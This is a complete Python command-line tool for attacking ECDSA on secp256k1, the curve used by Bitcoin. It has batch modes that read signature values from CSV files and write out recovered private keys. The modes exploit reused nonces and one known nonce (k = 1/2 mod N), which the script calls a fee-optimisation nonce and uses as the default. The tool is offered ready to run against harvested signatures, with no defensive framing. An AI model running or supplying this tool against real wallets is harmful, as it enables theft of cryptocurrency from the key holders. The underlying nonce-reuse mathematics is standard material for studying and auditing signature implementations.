#!/usr/bin/env python3
"""
ECDSA Signature Analysis — Extended
Supports:
  1. Public key recovery from (r, s, z)
  2. Nonce reuse attack (two sigs, same r)
  3. Known-nonce attack (private key from known k)
  4. Batch known-k attack from CSV — including the secp256k1 fee-optimization k
  5. Batch nonce-reuse attack from CSV (groups by r value)

CSV formats:
  known_k mode:   r,s,z[,label]
  nonce_reuse:    r,s,z[,label]   — groups rows by r automatically

Run:
  python3 ecdsa_analysis.py --known-k    signatures.csv [--k 0x...]
  python3 ecdsa_analysis.py --nonce-reuse signatures.csv
  python3 ecdsa_analysis.py --recover    signatures.csv
  python3 ecdsa_analysis.py --demo
  python3 ecdsa_analysis.py --gen-sample sample.csv
"""

import sys
import csv
import argparse
from hashlib import sha256
from itertools import combinations
from pathlib import Path
from collections import defaultdict

# ── secp256k1 ─────────────────────────────────────────────────────────────────
P	= 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
N	= 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
Gx	= 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy	= 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
G	= (Gx, Gy)

# k = 1/2 mod N  — the fee-optimisation nonce (90 leading zero bits in r)
K_FEE	= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A1

# ── elliptic curve primitives ─────────────────────────────────────────────────
def modinv(a, m):
	return pow(a, -1, m)

def point_add(P1, P2):
	if P1 is None: return P2
	if P2 is None: return P1
	x1, y1 = P1
	x2, y2 = P2
	if x1 == x2:
		if y1 != y2: return None
		lam = (3 * x1 * x1 * modinv(2 * y1, P)) % P
	else:
		lam = ((y2 - y1) * modinv(x2 - x1, P)) % P
	x3 = (lam * lam - x1 - x2) % P
	y3 = (lam * (x1 - x3) - y1) % P
	return (x3, y3)

def point_mul(k, point):
	result = None
	addend = point
	while k:
		if k & 1:
			result = point_add(result, addend)
		addend = point_add(addend, addend)
		k >>= 1
	return result

# precompute r for K_FEE once
_K_FEE_R = None
def get_kfee_r():
	global _K_FEE_R
	if _K_FEE_R is None:
		_K_FEE_R = point_mul(K_FEE, G)[0] % N
	return _K_FEE_R

# ── core crypto ───────────────────────────────────────────────────────────────
def privkey_from_known_k(r, s, z, k):
	"""d = (s*k - z) * r^-1 mod N"""
	return ((s * k - z) * modinv(r, N)) % N

def privkey_from_nonce_reuse(r, s1, z1, s2, z2):
	"""
	k  = (z1 - z2) * (s1 - s2)^-1 mod N
	d  = (s1*k - z1) * r^-1 mod N
	Returns (d, k) or (None, None).
	"""
	ds = (s1 - s2) % N
	if ds == 0:
		return None, None
	k = ((z1 - z2) * modinv(ds, N)) % N
	d = ((s1 * k - z1) * modinv(r, N)) % N
	return d, k

def pubkey_from_sig(r, s, z):
	"""Recover candidate public keys (up to 4) from (r, s, z)."""
	candidates = []
	for j in range(2):
		x = (r + j * N) % P
		y_sq = (pow(x, 3, P) + 7) % P
		y = pow(y_sq, (P + 1) // 4, P)
		if pow(y, 2, P) != y_sq:
			continue
		for sign in (y, P - y):
			R_pt	= (x, sign)
			r_inv	= modinv(r, N)
			sR	= point_mul(s, R_pt)
			zG	= point_mul(z, G)
			zG_neg	= (zG[0], (-zG[1]) % P)
			Q	= point_mul(r_inv, point_add(sR, zG_neg))
			if Q:
				candidates.append(Q)
	return candidates

def verify(pub, r, s, z):
	w	= modinv(s, N)
	u1	= (z * w) % N
	u2	= (r * w) % N
	pt	= point_add(point_mul(u1, G), point_mul(u2, pub))
	if pt is None: return False
	return pt[0] % N == r

def pubkey_compressed(point):
	x, y = point
	prefix = '02' if y % 2 == 0 else '03'
	return prefix + format(x, '064x')

def pubkey_uncompressed(point):
	x, y = point
	return '04' + format(x, '064x') + format(y, '064x')

# ── CSV I/O ───────────────────────────────────────────────────────────────────
def load_csv(path):
	"""
	Parses CSV with columns: r, s, z [, label]
	All numeric values hex (with or without 0x prefix).
	Returns list of dicts.
	"""
	rows = []
	with open(path, newline='') as f:
		lines = [l for l in f if not l.strip().startswith('#')]
	reader = csv.DictReader(lines)
	reader.fieldnames = [h.strip().lower() for h in reader.fieldnames]
	for i, row in enumerate(reader):
		try:
			r	= int(row['r'].strip(), 16)
			s	= int(row['s'].strip(), 16)
			z	= int(row['z'].strip(), 16)
			label	= row.get('label', f'row_{i}').strip() if row.get('label') else f'row_{i}'
			rows.append({'r': r, 's': s, 'z': z, 'label': label})
		except Exception as e:
			print(f"[!] Skipping row {i}: {e}")
	return rows

def write_results_csv(results, out_path):
	if not results:
		print("[!] No results to write.")
		return
	keys = list(results[0].keys())
	with open(out_path, 'w', newline='') as f:
		w = csv.DictWriter(f, fieldnames=keys)
		w.writeheader()
		w.writerows(results)
	print(f"[+] Results written to {out_path}")

# ── attack modes ──────────────────────────────────────────────────────────────
def attack_known_k(rows, k):
	print(f"\n[*] Known-k attack")
	print(f"    k = {hex(k)}")
	r_from_k = point_mul(k, G)[0] % N
	print(f"    r = {hex(r_from_k)}  ({256 - r_from_k.bit_length()} leading zero bits)")
	print(f"    Processing {len(rows)} signatures...\n")

	results = []
	recovered = 0
	for row in rows:
		r, s, z, label = row['r'], row['s'], row['z'], row['label']
		r_matches = (r == r_from_k)
		d = privkey_from_known_k(r, s, z, k)
		pub = point_mul(d, G)
		valid = verify(pub, r, s, z)
		if valid:
			recovered += 1
		rec = {
			'label':			label,
			'r':			hex(r),
			's':			hex(s),
			'z':			hex(z),
			'r_matches_k':		r_matches,
			'private_key':		hex(d),
			'pubkey_compressed':	pubkey_compressed(pub),
			'pubkey_uncompressed':	pubkey_uncompressed(pub),
			'sig_valid':		valid,
		}
		results.append(rec)
		km	= 'match' if r_matches else 'MISMATCH'
		st	= 'OK' if valid else 'INVALID'
		print(f"  [{label:20s}]  r={km}  d={hex(d)[:18]}...  sig={st}")

	print(f"\n[+] {recovered}/{len(rows)} private keys verified.")
	return results

def attack_nonce_reuse(rows):
	print(f"\n[*] Nonce-reuse attack")
	print(f"    Processing {len(rows)} signatures, grouping by r...\n")

	by_r = defaultdict(list)
	for row in rows:
		by_r[row['r']].append(row)

	results = []
	found = 0
	for r, group in by_r.items():
		if len(group) < 2:
			continue
		print(f"  [r = {hex(r)[:18]}...]  {len(group)} sigs share this nonce")
		for (a, b) in combinations(group, 2):
			s1, z1, l1 = a['s'], a['z'], a['label']
			s2, z2, l2 = b['s'], b['z'], b['label']
			if s1 == s2:
				continue
			d, k = privkey_from_nonce_reuse(r, s1, z1, s2, z2)
			if d is None:
				continue
			pub = point_mul(d, G)
			v1 = verify(pub, r, s1, z1)
			v2 = verify(pub, r, s2, z2)
			found += 1
			print(f"    {l1} × {l2}")
			print(f"      k = {hex(k)}")
			print(f"      d = {hex(d)}")
			print(f"      pub = {pubkey_compressed(pub)}")
			print(f"      verify = ({v1}, {v2})")
			results.append({
				'label_1':		l1,
				'label_2':		l2,
				'r':			hex(r),
				'recovered_k':		hex(k),
				'private_key':		hex(d),
				'pubkey_compressed':	pubkey_compressed(pub),
				'pubkey_uncompressed':	pubkey_uncompressed(pub),
				'sig1_valid':		v1,
				'sig2_valid':		v2,
			})

	print(f"\n[+] {found} private key(s) recovered.")
	return results

def attack_pubkey_recovery(rows):
	print(f"\n[*] Public key recovery")
	print(f"    Processing {len(rows)} signatures...\n")
	results = []
	for row in rows:
		r, s, z, label = row['r'], row['s'], row['z'], row['label']
		candidates = pubkey_from_sig(r, s, z)
		for i, q in enumerate(candidates):
			valid = verify(q, r, s, z)
			print(f"  [{label}] [{i}] {pubkey_compressed(q)}  valid={valid}")
			results.append({
				'label':		label,
				'r':		hex(r),
				'candidate_index':	i,
				'pubkey_compressed':	pubkey_compressed(q),
				'pubkey_uncompressed':	pubkey_uncompressed(q),
				'pubkey_x':		hex(q[0]),
				'pubkey_y':		hex(q[1]),
				'sig_valid':		valid,
			})
	return results

# ── demo ──────────────────────────────────────────────────────────────────────
def demo():
	print("=" * 64)
	print("DEMO: fee-optimisation k  (k = 1/2 mod N)")
	print("=" * 64)
	k	= K_FEE
	r	= get_kfee_r()
	print(f"k  = {hex(k)}")
	print(f"r  = {hex(r)}")
	print(f"r leading zero bits: {256 - r.bit_length()}")

	d	= 0xDEADBEEFCAFEBABE0000111100002222000033334444555566667777DEADBEEF
	z1	= int(sha256(b"pay alice 1 BTC").hexdigest(), 16)
	z2	= int(sha256(b"pay bob 2 BTC").hexdigest(), 16)
	kinv	= modinv(k, N)
	s1	= (kinv * (z1 + r * d)) % N
	s2	= (kinv * (z2 + r * d)) % N

	print(f"\nSig 1: r={hex(r)}  s={hex(s1)}")
	print(f"Sig 2: r={hex(r)}  s={hex(s2)}")

	d1 = privkey_from_known_k(r, s1, z1, k)
	d2 = privkey_from_known_k(r, s2, z2, k)
	print(f"\n[known-k]  from sig1: d={hex(d1)}  match={d1==d}")
	print(f"[known-k]  from sig2: d={hex(d2)}  match={d2==d}")

	d_nr, k_nr = privkey_from_nonce_reuse(r, s1, z1, s2, z2)
	print(f"\n[nonce-reuse]  k={hex(k_nr)}  match={k_nr==k}")
	print(f"[nonce-reuse]  d={hex(d_nr)}  match={d_nr==d}")

	print("\n" + "=" * 64)
	print("DEMO: pubkey recovery from single sig")
	print("=" * 64)
	pub_real = point_mul(d, G)
	for i, q in enumerate(pubkey_from_sig(r, s1, z1)):
		print(f"  [{i}] {pubkey_compressed(q)}  valid={verify(q,r,s1,z1)}  is_real={q==pub_real}")

def generate_sample_csv(path):
	"""Write a sample CSV using K_FEE so --known-k recovers all keys."""
	import random
	k	= K_FEE
	r	= get_kfee_r()
	kinv	= modinv(k, N)
	lines	= ["r,s,z,label"]
	for i in range(8):
		d_test	= random.randrange(1, N)
		z_test	= int(sha256(f"message_{i}".encode()).hexdigest(), 16)
		s_test	= (kinv * (z_test + r * d_test)) % N
		lines.append(f"{hex(r)},{hex(s_test)},{hex(z_test)},sample_{i}")
	Path(path).write_text("\n".join(lines))
	print(f"[+] Sample CSV written to {path}")
	print(f"    All rows use K_FEE — run with --known-k to recover private keys.")

# ── CLI ───────────────────────────────────────────────────────────────────────
def main():
	ap = argparse.ArgumentParser(
		description="ECDSA secp256k1 analysis: known-k, nonce-reuse, pubkey recovery",
		formatter_class=argparse.RawDescriptionHelpFormatter,
		epilog="""
Examples:
  python3 ecdsa_analysis.py --demo
  python3 ecdsa_analysis.py --gen-sample sample.csv
  python3 ecdsa_analysis.py --known-k sample.csv
  python3 ecdsa_analysis.py --known-k sigs.csv --k 0x1
  python3 ecdsa_analysis.py --nonce-reuse sigs.csv
  python3 ecdsa_analysis.py --recover sigs.csv --out pubkeys.csv
		"""
	)
	ap.add_argument('--demo',		action='store_true',
		help='Run built-in self-test demo')
	ap.add_argument('--gen-sample',	metavar='CSV',
		help='Generate sample CSV (all rows use K_FEE)')
	ap.add_argument('--known-k',	metavar='CSV',
		help='Batch known-k private key recovery from CSV')
	ap.add_argument('--nonce-reuse',	metavar='CSV',
		help='Batch nonce-reuse attack — groups rows by r')
	ap.add_argument('--recover',	metavar='CSV',
		help='Batch public key recovery from CSV')
	ap.add_argument('--k',		metavar='HEX',
		default=hex(K_FEE),
		help=f'Known nonce k (hex). Default: K_FEE')
	ap.add_argument('--out',		metavar='CSV',
		help='Output CSV path (auto-named if omitted)')
	args = ap.parse_args()

	if args.demo:
		demo()
		return

	if args.gen_sample:
		generate_sample_csv(args.gen_sample)
		return

	k_val = int(args.k, 16)

	if args.known_k:
		rows	= load_csv(args.known_k)
		results	= attack_known_k(rows, k_val)
		out	= args.out or args.known_k.replace('.csv', '_privkeys.csv')
		write_results_csv(results, out)
		return

	if args.nonce_reuse:
		rows	= load_csv(args.nonce_reuse)
		results	= attack_nonce_reuse(rows)
		out	= args.out or args.nonce_reuse.replace('.csv', '_recovered.csv')
		write_results_csv(results, out)
		return

	if args.recover:
		rows	= load_csv(args.recover)
		results	= attack_pubkey_recovery(rows)
		out	= args.out or args.recover.replace('.csv', '_pubkeys.csv')
		write_results_csv(results, out)
		return

	ap.print_help()

if __name__ == '__main__':
	main()
